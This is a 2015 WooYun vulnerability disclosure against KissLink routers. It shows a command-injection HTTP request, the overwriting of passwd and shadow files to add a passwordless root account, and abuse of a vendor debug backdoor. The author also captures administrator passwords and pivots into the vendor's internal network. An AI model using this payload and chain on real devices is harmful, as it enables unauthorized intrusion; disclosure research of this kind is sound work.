{"id": 71696, "wybug_id": "wooyun-2015-0139347", "wybug_title": "智能设备安全之kisslink看我如何从一台路由器权限到所有路由器权限再到所有路由器内网", "wybug_corp": "kisslink.com", "wybug_author": "路人甲", "wybug_date": "2015-09-07 10:32", "wybug_open_date": "2015-12-06 12:14", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "远程控制", "智能设备"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向公众公开  简要描述： 点一根红梅，抽一口寂寞；kiss 下路由，穿透到内网。 详细说明：  隔壁的女神买了所谓不“kiss”便不让上的“kisslnk”路由器，这是对我有什么暗示吗？只怪我太年轻，“kiss”之路漫漫修远兮，屌丝还须上下去摸索。索性我也买个 kisslink 路由器来，对其一探究竟。女神的诱惑还是蛮大的，我费了九牛二虎之力把买来的 kisslink 组成下面的网络环境，用来分析 kisslink 的安全性。\n\n分析思路是：1. 通过笔记本对 kisslink 扫描，用于检测路由器开放端口情况；2. 通过 burp suite 抓取 app 和 kisslink 路由器通讯的数据，用于检测路由器是否存在漏洞；3. 通过 openwrt 上 tcpdump 抓取 kisslink 和云端通讯数据，用于检测路由器和云端是否存在漏洞；4. 通过 openwrt 上 tcpdump 抓取 kisslink 和云端通讯数据，获取路由器固件下载地址；按照思路行动起来，经过漫长的 配置->抓包->分析->测试过程，我们得到如下结果：1. 路由器开放 23 端口，用户名密码未知；\n$ nmap -p1-65535 192.168.200.1Nmap scan report for www.kisslink.com (192.168.200.1)Host is up (0.0013s latency).Not shown: 65529 closed portsPORT      STATE SERVICE23/tcp    open  telnet53/tcp    open  domain80/tcp    open  http442/tcp   open  cvc_hostd443/tcp   open  https20000/tcp open  dnp\n2. 路由器某接口存在命令注入漏洞，gw 参数过滤不严格造成命令注入\nPOST /app.cgi HTTP/1.1Host: 192.168.200.1:442Content-Type: application/x-www-form-urlencodedConnection: keep-aliveProxy-Connection: keep-aliveAccept: */*User-Agent: KissLink/1 (iPad; iOS 8.1; Scale/2.00)Accept-Language: zh-Hans;q=1, en;q=0.9Accept-Encoding: gzip, deflateContent-Length: 296dns_server=x.x.x.x&gw=x.x.x.x;ping -c 3 192.168.200.3;&id=x&ip=x.x.x.x&mask=255.255.255.0&opt=add&opttype=setup_dhcp&type=static&uuid=xxx\n3. 路由器固件地址为：http://api.kisslink.com:31082/NBOS-1.1.0.1766，包如下：\n\n战果不错，其实到这里我们通过命令注入漏洞已经能够获取到路由器的权限。但是对于接近女神毫无卵用。有了路由器的权限我们继续深挖，通过前面的命令注入漏洞，直接覆盖 /etc/passwd 和 /etc/shadow 文件，添加一个空密码的 root 用户，先登录到路由器里面，找啊找，找啊找，找到了好多有用的信息1. 路由器启动 dropbear，但是却监听到了 127.0.0.1 的 2222 端口；2. 在 /usr/local/sbin 目录内发现一个好有爱的 start_ssh 文件，内容：\nkillall -9 dbclient 2>&1 1>/dev/nullkillall -9 dbclient 2>&1 1>/dev/null/usr/local/sbin/dbclient 10000:127.0.0.1:2222 root@debug.kisslink.com 2>&1 1>/dev/null\ndbclient 是 openwrt 下的 SSH 客户端，上面的那条命令应该是端口转发的，把路由器本地的 2222 端口转发到 debug.kisslink.com 这台服务器的 10000 端口我在路由器上手动执行下这条命令\n/usr/local/sbin # /usr/local/sbin/dbclient 10000:127.0.0.1:2222 root@debug.kisslink.com 2>&1 1>/dev/nullHost 'debug.kisslink.com' key accepted unconditionally.(ssh-rsa fingerprint md5 9f:30:51:bb:74:a4:91:54:85:9e:b7:fa:af:13:ba:b5)\n命令没有任何错误回显，执行成功，通过 ps 和 netstat 验证下\n3872 root      1172 S    /usr/local/sbin/dbclient 10000:127.0.0.1:2222 root@debug.kisslink.comtcp        0      0 192.168.199.181:55749   182.92.71.177:ssh       ESTABLISHED\n请注意，我们没有输入任何密码。也就是说路由器上存放有私钥或者密码等认证信息，找啊找，找啊找，找到了，在 /etc/rc.d 目录下 kickoff.sh 这个文件，这是路由器启动初始化的脚本文件，里面有这么一行：\nexport DROPBEAR_PASSWORD=\n\nmask 区域\n\n*****c4890*****\n\n\n\n\n在这个过程中我让同事帮我逆向了 dbclient 这个文件，看看密码是不是存放在这个文件里面，很快他就告诉我看看是不是有 DROPBEAR_PASSWORD 这个环境变量。我们知道了 root debug.kisslink.com \n\nmask 区域\n*****c4*****\n\n，还有什么好说的，登录呀\n\n还记得上面所说的反弹端口吧，这个功能我揣测是官方留的调试“后门”，不过是不是所有的路由器都可以反弹呢？感觉离女神又近了，我就在服务器上继续，找啊找，找啊找，还真被我找到了，http://debug.kisslink.com:8080/login.html，既然我们有服务器权限，想办法登录进去\n\n\n\n\n\n所有路由器啊，不但能够远程更新路由器固件，还能够对任意一台在线路由器启动反弹 SSH 的操作，BUT，我们不知道路由器密码。女神就在眼前，我怎么能让自己看不见，既然管理员是通过这台服务器管理的路由器，那我就想办法在管理员去管理其他路由器的时候记录下路由器的密码，反正不管你信不信，我是相信所有路由器的密码都是一样的。功夫不负人，不日就获取到了路由器密码\n\n\nmask 区域\n\n*****@Y*****\n\n\n\n\n女神我来了！！！我想 kisslink 厂商自己内部肯定使用了 kisslink 路由器，我们想办法连到内网去。首先我们通过服务器的日志获取到 kisslink 办公出口 IP，不出所料应该是下面这个：\n106.2.160.56\n通过管理后台，查询到有下面三个路由器\n\n通过链接 http://debug.kisslink.com:8080/ap_detail.php?wtpindex=5067 查看这台路由器，然后“启动反向”功能，反弹到本地的 10122 端口，我们在服务器上登录下试试\n[root@iZ259yz43shZ ~]# ssh prome@127.0.0.1 -p10122The authenticity of host '[127.0.0.1]:10122 ([127.0.0.1]:10122)' can't be established.RSA key fingerprint is a1:b1:db:11:d8:ed:7f:b7:8b:70:c6:b7:b2:dd:f7:b9.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '[127.0.0.1]:10122' (RSA) to the list of known hosts.prome@127.0.0.1's password: ~ # /sbin/ifconfigath1      Link encap:Ethernet  HWaddr CC:10:A3:01:03:D2            UP BROADCAST RUNNING MULTICAST  MTU:2290  Metric:1          RX packets:23773867 errors:0 dropped:0 overruns:0 frame:0          TX packets:37000280 errors:0 dropped:11 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:73757821 (70.3 MiB)  TX bytes:673372592 (642.1 MiB)ath2      Link encap:Ethernet  HWaddr CC:10:A3:01:03:D3            UP BROADCAST RUNNING MULTICAST  MTU:2290  Metric:1          RX packets:1408540 errors:0 dropped:0 overruns:0 frame:0          TX packets:1876604 errors:0 dropped:55169 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:183069717 (174.5 MiB)  TX bytes:2269038636 (2.1 GiB)eth0      Link encap:Ethernet  HWaddr CC:10:A3:01:03:D0            inet addr:192.168.2.62  Bcast:192.168.2.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:362560 errors:0 dropped:4 overruns:0 frame:0          TX packets:306375 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:322235162 (307.3 MiB)  TX bytes:60800466 (57.9 MiB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:10972 errors:0 dropped:0 overruns:0 frame:0          TX packets:10972 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:1194199 (1.1 MiB)  TX bytes:1194199 (1.1 MiB)vlan1     Link encap:Ethernet  HWaddr CC:10:A3:01:03:D2            inet addr:192.168.200.1  Bcast:192.168.200.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:25180619 errors:0 dropped:0 overruns:0 frame:0          TX packets:37654130 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:3645069465 (3.3 GiB)  TX bytes:1947806617 (1.8 GiB)vlan10    Link encap:Ethernet  HWaddr CC:10:A3:01:03:D1            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:0 (0.0 B)  TX bytes:468 (468.0 B)wifi0     Link encap:UNSPEC  HWaddr CC-10-A3-01-03-D1-00-00-00-00-00-00-00-00-00-00            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:54138621 errors:0 dropped:0 overruns:0 frame:0          TX packets:44212470 errors:209039 dropped:313 overruns:0 carrier:0          collisions:0 txqueuelen:511           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)          Interrupt:2 Memory:b8100000-b811ffff ~ #\n简单对内网做了下探测，192.168.2.250 应该是内部的测试服务器，\n~ # wget 192.168.2.250--2015-09-06 16:46:04--  http://192.168.2.250/Connecting to 192.168.2.250:80... connected.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Saving to: `index.html'    [ <=>                                                                                                          ] 13,711      --.-K/s   in 0s      2015-09-06 16:46:04 (48.7 MB/s) - `index.html' saved [13711]~ # lsindex.html~ # ~ # ~ # more index.html <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"><html> <head>  <title>Index of /</title> </head> <body><h1>Index of /</h1>  <table>   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>   <tr><th colspan=\"5\"><hr></th></tr><tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"a.py\">a.py</a></td><td align=\"right\">2015-06-03 10:42  </td><td align=\"right\">528 </td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"about.html\">about.html</a></td><td align=\"right\">2015-06-03 10:42  </td><td align=\"right\"> 17K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"about.php\">about.php</a></td><td align=\"right\">2015-06-03 10:50  </td><td align=\"right\">1.2K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"amqp_consumer\">amqp_consumer</a></td><td align=\"right\">2015-07-31 14:26  </td><td align=\"right\">108K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"app.cgi2\">app.cgi2</a></td><td align=\"right\">2015-05-28 17:13  </td><td align=\"right\">7.8K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"assets/\">assets/</a></td><td align=\"right\">2015-06-03 10:42  </td><td align=\"right\">  - </td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"blog.php\">blog.php</a></td><td align=\"right\">2015-06-03 10:50  </td><td align=\"right\">1.2K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"cgic.c\">cgic.c</a></td><td align=\"right\">2015-06-23 15:47  </td><td align=\"right\"> 57K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"cgic.h\">cgic.h</a></td><td align=\"right\">2015-06-23 11:22  </td><td align=\"right\">7.2K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"css/\">css/</a></td><td align=\"right\">2015-07-02 16:57  </td><td align=\"right\">  - </td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"diff\">diff</a></td><td align=\"right\">2015-07-20 14:22  </td><td align=\"right\">433K</td><td>&nbsp;</td></tr><tr><td valign=\"top\"><img src=\"/icons/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"download/\">download/</a></td><td align=\"right\">2015-06-03 10:42  </td>\n该服务器的 8080 端口应该是 Bugzilla 系统\n~ # wget 192.168.2.250:8080--2015-09-06 16:46:21--  http://192.168.2.250:8080/Connecting to 192.168.2.250:8080... connected.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Saving to: `index.html.1'    [ <=>                                                                                                          ] 11,047      --.-K/s   in 0.007s  2015-09-06 16:46:21 (1.59 MB/s) - `index.html.1' saved [11047]~ # more index.html.1 <!DOCTYPE html><html lang=\"en\">  <head>    <title>Bugzilla Main Page</title>      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><link href=\"data/assets/2f5735cf3abd04bddc8e363a8613a9f5.css\" rel=\"stylesheet\" type=\"text/css\">    <script type=\"text/javascript\" src=\"data/assets/1b4e898422a669ab82b604a2c23edce5.js\"></script>    <script type=\"text/javascript\">    <!--        YAHOO.namespace('bugzilla');        YAHOO.util.Event.addListener = function (el, sType, fn, obj, overrideContext) {               if ( (\"onpagehide\" in window || YAHOO.env.ua.gecko) && sType === \"unload\") { sType = \"pagehide\"; };               var capture = ((sType == \"focusin\" || sType == \"focusout\") && !YAHOO.env.ua.ie) ? true : false;               return this._addListener(el, this._getType(sType), fn, obj, overrideContext, capture);         };        if ( \"onpagehide\" in window || YAHOO.env.ua.gecko) {            YAHOO.util.Event._simpleRemove(window, \"unload\",                                            YAHOO.util.Event._unload);        }                function unhide_language_selector() {             YAHOO.util.Dom.removeClass(                'lang_links_container', 'bz_default_hidden'            );         }         YAHOO.util.Event.onDOMReady(unhide_language_selector);\n好吧，到此为止，以上所有操作均以安全研究为出发点，没有对服务器，路由器做任何多余的操作，尤其是破坏性操作，同时没有获取任何数据。   漏洞证明：  上面的详细说明已经很清楚了，这里就不再赘述。   修复方案：  看起来修复的工作量还是蛮大的：1. 修复路由器的漏洞；2. 修改服务器和路由器的密码；3. 禁用后门功能；   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-07 12:13 厂商回复： 感谢路人甲发现我们的漏洞，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-06 17:30 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  给力，智能路由器漏洞    \n     2015-09-06 17:32 |    \t\t乌云小秘书  \t\t\t( 普通白帽子  |\t\t\t        还没有发布任何漏洞        | 第1!绝对不意气用事!第2!绝对不漏判任何一...)\t\t \n  太牛逼。。。。。。其实可以无限深挖的    \n     2015-09-06 18:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:20        | 当我又回首一切,这个世界会好吗?)\t\t \n  NB    \n     2015-09-06 20:01 |    \t\t李叫兽就四李叫兽 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:23        | 啦啦啦啦)\t\t \n  流弊！    \n     2015-09-06 22:09 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:92        | 硬件与无线通信研究方向)\t\t \n  牛逼，mark    \n     2015-09-06 22:41 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:309 漏洞数:86        | http://www.tomatoyu.com/)\t\t \n  给力，智能路由器漏洞    \n     2015-09-07 10:48 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  看到标题我就点关注了    \n     2015-09-07 10:50 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 哈！躁起来！)\t\t \n  内容精彩、文笔漂亮，很久没有这么细致的分析了    \n     2015-09-07 10:54 |    \t\t赵健康 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        | 慢慢进步！！！)\t\t \n  牛鼻    \n     2015-09-07 11:37 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:25        | 开发真是日了狗了)\t\t \n  mark    \n     2015-09-07 11:58 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:545 漏洞数:130        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  路人甲好可怕！！！    \n     2015-09-07 11:59 |    \t\tk0_pwn \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 专注二进制许多年，突然觉得web才好玩)\t\t \n  洞主吟了一首好诗！    \n     2015-09-07 12:38 |    \t\txk0n \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | ..)\t\t \n  好牛的路人甲    \n     2015-09-07 16:58 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:193        | 。)\t\t \n  好可怕    \n     2015-09-07 19:03 |    \t\t咚咚呛 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:10        | 我是一只小毛驴咿呀咿呀呦~~)\t\t \n  感谢路人甲，曾经我也以为路人甲是一个人，一直认为是大神，每天发那么多洞。    \n     2015-09-12 14:26 |    \t\tDBA \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:13        | 零下37.5°C)\t\t \n  妈妈问我为什么跪着玩电脑。    \n     2015-11-11 12:34 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:522 漏洞数:78        | 潜心学习~~~)\t\t \n  清晰、细致。谢LZ。另外，这个上面怎么没有$呢？    \n     2015-11-11 16:25 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:206 漏洞数:24        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  最后看到女神了咩？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}